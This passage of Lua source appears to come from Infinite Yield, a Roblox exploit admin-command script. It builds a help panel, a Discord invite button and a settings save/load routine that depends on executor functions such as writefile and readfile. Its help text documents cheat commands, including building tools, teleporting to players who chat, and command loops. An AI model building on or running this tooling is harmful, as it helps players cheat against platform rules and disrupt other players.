		{35,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={33},Position=UDim2.new(0,63,0,0),Size=UDim2.new(1,0,1,0),Text="- players who are on your team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{36,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{37,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={36},Size=UDim2.new(1,0,1,0),Text="enemies / nonteam",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{38,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={36},Position=UDim2.new(0,101,0,0),Size=UDim2.new(1,0,1,0),Text="- players who are not on your team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{39,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{40,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={39},Size=UDim2.new(1,0,1,0),Text="friends",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{41,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={39},Position=UDim2.new(0,40,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone who is friends with you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{42,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{43,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={42},Size=UDim2.new(1,0,1,0),Text="nonfriends",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{44,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={42},Position=UDim2.new(0,61,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone who is not friends with you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{45,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{46,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={45},Size=UDim2.new(1,0,1,0),Text="guests",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{47,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={45},Position=UDim2.new(0,36,0,0),Size=UDim2.new(1,0,1,0),Text="- guest players (obsolete)",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{48,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{49,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={48},Size=UDim2.new(1,0,1,0),Text="bacons",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{50,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={48},Position=UDim2.new(0,40,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone with the \"bacon\" or pal hair",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{51,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{52,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={51},Size=UDim2.new(1,0,1,0),Text="age[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{53,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={51},Position=UDim2.new(0,71,0,0),Size=UDim2.new(1,0,1,0),Text="- includes anyone below or at the given age",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{54,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{55,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={54},Size=UDim2.new(1,0,1,0),Text="rad[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{56,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={54},Position=UDim2.new(0,70,0,0),Size=UDim2.new(1,0,1,0),Text="- includes anyone within the given radius",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{57,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{58,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={57},Size=UDim2.new(1,0,1,0),Text="nearest",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{59,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={57},Position=UDim2.new(0,43,0,0),Size=UDim2.new(1,0,1,0),Text="- gets the closest player to you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{60,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{61,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={60},Size=UDim2.new(1,0,1,0),Text="farthest",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{62,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={60},Position=UDim2.new(0,46,0,0),Size=UDim2.new(1,0,1,0),Text="- gets the farthest player from you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{63,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{64,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={63},Size=UDim2.new(1,0,1,0),Text="group[ID]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{65,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={63},Position=UDim2.new(0,55,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are in a certain group",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{66,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{67,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={66},Size=UDim2.new(1,0,1,0),Text="alive",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{68,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={66},Position=UDim2.new(0,27,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are alive",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{69,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
		{70,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={69},Size=UDim2.new(1,0,1,0),Text="dead",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{71,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={69},Position=UDim2.new(0,29,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are dead",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{72,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,180),ZIndex=10,}},
		{73,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={72},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Various Operators",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
		{74,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={72},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
		{75,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={72},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,16),Text="Use commas to separate multiple expressions:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
		{76,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={72},Position=UDim2.new(0,8,0,75),Size=UDim2.new(1,-8,0,16),Text="Use - to exclude, and + to include players in your expression:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
		{77,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={72},Position=UDim2.new(0,8,0,91),Size=UDim2.new(1,-8,0,16),Text=";locate %blue-friends (gets players in blue team who aren't your friends)",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
		{78,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={72},Position=UDim2.new(0,8,0,46),Size=UDim2.new(1,-8,0,16),Text=";locate noob,noob2,bob",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
		{79,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={72},Position=UDim2.new(0,8,0,120),Size=UDim2.new(1,-8,0,16),Text="Put ! before a command to run it with the last arguments it was ran with:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
		{80,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={72},Position=UDim2.new(0,8,0,136),Size=UDim2.new(1,-8,0,32),Text="After running ;offset 0 100 0,  you can run !offset anytime to repeat that command with the same arguments that were used to run it last time",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
		{81,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,154),ZIndex=10,}},
		{82,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={81},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Command Looping",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
		{83,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={81},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,20),Text="Form: [How many times it loops]^[delay (optional)]^[command]",TextColor3=Color3.new(1,1,1),TextSize=15,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{84,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={81},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
		{85,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={81},Position=UDim2.new(0,8,0,50),Size=UDim2.new(1,-8,0,20),Text="Use the 'breakloops' command to stop all running loops.",TextColor3=Color3.new(1,1,1),TextSize=15,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{86,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={81},Position=UDim2.new(0,8,0,80),Size=UDim2.new(1,-8,0,16),Text="Examples:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
		{87,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={81},Position=UDim2.new(0,8,0,98),Size=UDim2.new(1,-8,0,42),Text=";5^btools - gives you 5 sets of btools\n;10^3^drophats - drops your hats every 3 seconds 10 times\n;inf^0.1^animspeed 100 - infinitely loops your animation speed to 100",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
		{88,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,120),ZIndex=10,}},
		{89,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={88},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Execute Multiple Commands at Once",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
		{90,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={88},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,20),Text="You can execute multiple commands at once using \"\\\"",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{91,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={88},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
		{92,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={88},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,-8,0,16),Text="Examples:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
		{93,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={88},Position=UDim2.new(0,8,0,78),Size=UDim2.new(1,-8,0,32),Text=";drophats\\respawn - drops your hats and respawns you\n;enable inventory\\enable playerlist\\refresh - enables those coregui items and refreshes you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
		{94,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,75),ZIndex=10,}},
		{95,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={94},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Browse Command History",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
		{96,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={94},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="While focused on the command bar, you can use the up and down arrow keys to browse recently used commands",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{97,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={94},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
		{98,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,75),ZIndex=10,}},
		{99,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={98},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Autocomplete in the Command Bar",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
		{100,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={98},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="While focused on the command bar, you can use the tab key to insert the top suggested command into the command bar.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{101,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={98},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
		{102,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,175),ZIndex=10,}},
		{103,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={102},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Using Event Binds",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
		{104,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={102},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="Use event binds to set up commands that get executed when certain events happen. You can edit the conditions for an event command to run (such as which player triggers it).",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{105,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={102},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
		{106,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={102},Position=UDim2.new(0,8,0,70),Size=UDim2.new(1,-8,0,48),Text="Some events may send arguments; you can use them in your event command by using $ followed by the argument number ($1, $2, etc). You can find out the order and types of these arguments by looking at the settings of the event command.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{107,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={102},Position=UDim2.new(0,8,0,130),Size=UDim2.new(1,-8,0,16),Text="Example:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
		{108,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={102},Position=UDim2.new(0,8,0,148),Size=UDim2.new(1,-8,0,16),Text="Setting up 'goto $1' on the OnChatted event will teleport you to any player that chats.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
		{109,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,105),ZIndex=10,}},
		{110,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={109},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Get Further Help",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
		{111,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={109},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="You can join the Discord server to get support with IY,  and read up on more documentation such as the Plugin API.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
		{112,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={109},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),Visible=false,ZIndex=10,}},
		{113,"TextButton",{BackgroundColor3=Color3.new(0.48627451062202,0.61960786581039,0.85098040103912),BorderColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),Font=4,Name="InviteButton",Parent={109},Position=UDim2.new(0,5,0,75),Size=UDim2.new(1,-10,0,25),Text="Copy Discord Invite Link (https://discord.io/infiniteyield)",TextColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),TextSize=16,ZIndex=10,}},
	})
	for i,v in pairs(main.Content.List:GetDescendants()) do
		if v:IsA("TextLabel") then
			table.insert(text1,v)
		end
	end
	table.insert(scroll,main.Content.List)
	table.insert(shade1,main.Content)
	table.insert(shade2,main.TopBar)
	main.Name = randomString()
	main.TopBar.Close.MouseButton1Click:Connect(function()
		main:TweenPosition(UDim2.new(0.5,-250,0,-500), "InOut", "Quart", 0.5, true, nil)
	end)
	local inviteButton = main:FindFirstChild("InviteButton",true)
	local lastPress = nil
	inviteButton.MouseButton1Click:Connect(function()
		local func = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
		if func then
			func("https://discord.io/infiniteyield")
			inviteButton.Text = "Copied"
		else
			inviteButton.Text = "No Clipboard Function, type out the link"
		end
		local pressTime = tick()
		lastPress = pressTime
		wait(2)
		if lastPress ~= pressTime then return end
		inviteButton.Text = "Copy Discord Invite Link (https://discord.io/infiniteyield)"
	end)
	dragGUI(main)
	main.Parent = PARENT

	ReferenceButton.MouseButton1Click:Connect(function()
		main:TweenPosition(UDim2.new(0.5,-250,0.5,-150), "InOut", "Quart", 0.5, true, nil)
	end)
end)()

currentShade1 = Color3.fromRGB(36, 36, 37)
currentShade2 = Color3.fromRGB(46, 46, 47)
currentShade3 = Color3.fromRGB(78, 78, 79)
currentText1 = Color3.new(1, 1, 1)
currentText2 = Color3.new(0, 0, 0)
currentScroll = Color3.fromRGB(78,78,79)

defaultsettings = {
	prefix = ';';
	StayOpen = true;
	logsEnabled = false;
	jLogsEnabled = false;
	aliases = {};
	binds = {};
	WayPoints = {};
	PluginsTable = {};
	currentShade1 = {currentShade1.R,currentShade1.G,currentShade1.B};
	currentShade2 = {currentShade2.R,currentShade2.G,currentShade2.B};
	currentShade3 = {currentShade3.R,currentShade3.G,currentShade3.B};
	currentText1 = {currentText1.R,currentText1.G,currentText1.B};
	currentText2 = {currentText2.R,currentText2.G,currentText2.B};
	currentScroll = {currentScroll.R,currentScroll.G,currentScroll.B};
	eventBinds = eventEditor.SaveData()
}

defaults = game:GetService("HttpService"):JSONEncode(defaultsettings)

nosaves = false

local loadedEventData = nil
function saves()
	if writefileExploit() then
		if pcall(function() readfile("IY_FE.iy") end) then
			if readfile("IY_FE.iy") ~= nil then
				local success, response = pcall(function()
					local json = game:GetService("HttpService"):JSONDecode(readfile("IY_FE.iy"))
					if json.prefix ~= nil then prefix = json.prefix else prefix = ';' end
					if json.StayOpen ~= nil then StayOpen = json.StayOpen else StayOpen = false end
					if json.logsEnabled ~= nil then logsEnabled = json.logsEnabled else logsEnabled = false end
					if json.jLogsEnabled ~= nil then jLogsEnabled = json.jLogsEnabled else jLogsEnabled = false end
					if json.aliases ~= nil then aliases = json.aliases else aliases = {} end
					if json.binds ~= nil then binds = json.binds else binds = {} end
					if json.spawnCmds ~= nil then spawnCmds = json.spawnCmds end
					if json.WayPoints ~= nil then AllWaypoints = json.WayPoints else WayPoints = {} AllWaypoints = {} end
					if json.PluginsTable ~= nil then PluginsTable = json.PluginsTable else PluginsTable = {} end
					if json.currentShade1 ~= nil then currentShade1 = Color3.new(json.currentShade1[1],json.currentShade1[2],json.currentShade1[3]) end
					if json.currentShade2 ~= nil then currentShade2 = Color3.new(json.currentShade2[1],json.currentShade2[2],json.currentShade2[3]) end
					if json.currentShade3 ~= nil then currentShade3 = Color3.new(json.currentShade3[1],json.currentShade3[2],json.currentShade3[3]) end
					if json.currentText1 ~= nil then currentText1 = Color3.new(json.currentText1[1],json.currentText1[2],json.currentText1[3]) end
					if json.currentText2 ~= nil then currentText2 = Color3.new(json.currentText2[1],json.currentText2[2],json.currentText2[3]) end
					if json.currentScroll ~= nil then currentScroll = Color3.new(json.currentScroll[1],json.currentScroll[2],json.currentScroll[3]) end
					if json.eventBinds then loadedEventData = json.eventBinds end
				end)
				if not success then
					warn("Save Json Error:", response)
					warn("Overwriting Save File")
					writefileCooldown("IY_FE.iy", defaults)
					wait()
					saves()
				end
			else
				writefileCooldown("IY_FE.iy", defaults)
				wait()
				saves()
			end
		else
			writefileCooldown("IY_FE.iy", defaults)
			wait()
			if pcall(function() readfile("IY_FE.iy") end) then
				saves()
			else
				nosaves = true
				prefix = ';'
				StayOpen = false
				logsEnabled = false
				jLogsEnabled = false
				aliases = {}
				binds = {}
				WayPoints = {}
				PluginsTable = {}

				local FileError = Instance.new("Frame")
				local background = Instance.new("Frame")
				local Directions = Instance.new("TextLabel")
				local shadow = Instance.new("Frame")
				local PopupText = Instance.new("TextLabel")
				local Exit = Instance.new("TextButton")
				local ExitImage = Instance.new("ImageLabel")

				FileError.Name = randomString()
				FileError.Parent = PARENT
				FileError.Active = true
				FileError.BackgroundTransparency = 1
				FileError.Position = UDim2.new(0.5, -180, 0, 290)
				FileError.Size = UDim2.new(0, 360, 0, 20)
				FileError.ZIndex = 10

				background.Name = "background"
				background.Parent = FileError
				background.Active = true
				background.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
				background.BorderSizePixel = 0
				background.Position = UDim2.new(0, 0, 0, 20)
				background.Size = UDim2.new(0, 360, 0, 205)
				background.ZIndex = 10

				Directions.Name = "Directions"
				Directions.Parent = background
				Directions.BackgroundTransparency = 1
				Directions.BorderSizePixel = 0
				Directions.Position = UDim2.new(0, 10, 0, 10)
				Directions.Size = UDim2.new(0, 340, 0, 185)
				Directions.Font = Enum.Font.SourceSans
				Directions.TextSize = 14
